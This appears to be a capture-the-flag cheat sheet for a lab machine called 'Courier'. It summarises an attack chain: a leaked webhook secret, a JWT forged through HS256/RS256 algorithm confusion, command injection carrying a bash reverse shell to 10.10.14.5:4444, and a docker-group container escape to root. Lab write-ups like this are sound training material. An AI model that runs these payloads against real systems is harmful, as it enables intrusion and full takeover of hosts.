# Courier - Quick Reference

## Attack Chain Summary

1. **Find webhook secret** in `/public/main.js`: `courier_webhook_secret_2024`
2. **Trigger webhook** → Get public key and repo URL from logs
3. **Forge JWT** using HS256 with public key (algorithm confusion)
4. **Command injection** via `/admin/build` endpoint
5. **Docker escape** to root (runner user in docker group)

## Key Endpoints

- `GET /` - Home page (leaks webhook secret in JS)
- `POST /webhook/trigger` - Webhook endpoint (requires secret)
- `POST /admin/build` - Admin build trigger (requires admin JWT)
- `GET /admin/status` - Admin status check

## JWT Payload

```json
{
  "username": "admin",
  "role": "admin",
  "iat": 1234567890
}
```

Sign with: HS256 algorithm, public key as secret

## Command Injection Payload

```json
{
  "buildCommand": "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
}
```

## Docker Escape

```bash
docker run -it -v /:/mnt ubuntu:22.04 chroot /mnt bash
```

## Flags

- User: `/home/runner/user.txt`
- Root: `/root/root.txt`

